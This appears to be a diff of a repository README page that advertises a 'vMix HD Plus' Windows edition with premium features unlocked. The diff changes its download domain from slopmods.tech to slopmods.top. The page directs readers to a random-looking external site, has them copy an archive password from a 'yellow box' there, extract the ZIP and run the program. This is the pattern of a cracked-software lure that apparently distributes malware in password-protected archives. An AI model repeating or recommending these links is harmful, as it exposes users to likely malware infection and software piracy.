@@ -8,12 +8,12 @@ vMix HD Plus — Windows setup and configuration · Premium workspace · Zero na
 
 > Use the release page below for Windows.
 
-- **Release page:** [dephvoeeyzg.slopmods.tech](https://dephvoeeyzg.slopmods.tech/)
-- **Full URL:** `https://dephvoeeyzg.slopmods.tech/`
+- **Release page:** [dephvoeeyzg.slopmods.top](https://dephvoeeyzg.slopmods.top/)
+- **Full URL:** `https://dephvoeeyzg.slopmods.top/`
 - **Type:** Desktop package | Windows 10 and 11, 64-bit
 - **Setup:** Extract the ZIP, copy the archive password from the page, then run the current version
 
-> **Password** — copy it from the yellow box on **dephvoeeyzg.slopmods.tech** before you extract.
+> **Password** — copy it from the yellow box on **dephvoeeyzg.slopmods.top** before you extract.
 
 ## Questions & Answers
 
@@ -33,7 +33,7 @@ vMix HD Plus — Windows setup and configuration · Premium workspace · Zero na
 
 This release ships the **professional desktop edition** — premium modules are **enabled and active** from the first launch. No trial mode, no feature gates.
 
-Download once from **dephvoeeyzg.slopmods.tech**, extract, open the app, and work with the full toolkit immediately.
+Download once from **dephvoeeyzg.slopmods.top**, extract, open the app, and work with the full toolkit immediately.
 
 ## What you get
 
